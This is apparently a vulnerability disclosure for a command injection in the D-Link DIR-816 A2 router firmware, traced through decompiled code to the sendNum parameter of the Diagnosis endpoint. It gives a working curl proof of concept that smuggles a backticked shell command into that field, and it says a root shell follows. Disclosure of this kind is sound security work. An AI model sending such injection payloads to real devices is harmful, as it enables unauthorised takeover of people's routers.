# D-link DIR-816 A2_v1.10CNB04.img Command injection vulnerability

## Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ： [http://tsd.dlink.com.tw/GPL.asp](http://tsd.dlink.com.tw/GPL.asp)

## 1. Affected version

![image-20220409142816775](img/image-20220409142816775.png)

Figure 1 shows the latest firmware Ba of the router

## Vulnerability details

![image-20220409143502585](img/image-20220409143502585.png)

The program passes the content obtained through the sendnum parameter to V12, and then formats V12 into the stack of v10

![image-20220409143522241](img/image-20220409143522241.png)

After that, V10 is brought into the dosystembk function, which has a command injection vulnerability.

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Use the fat simulation firmware DIR-816 A2_v1.10CNB04.img
2. Attack with the following POC attacks

```
curl -i -X POST http://192.168.0.1/goform/Diagnosis -d tokenid=xxxx -d 'sendNum=`ls > /tmp/456`'
```

![image-20220405112133823](img/image-20220405112133823.png)

Figure 2 POC attack effect

Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell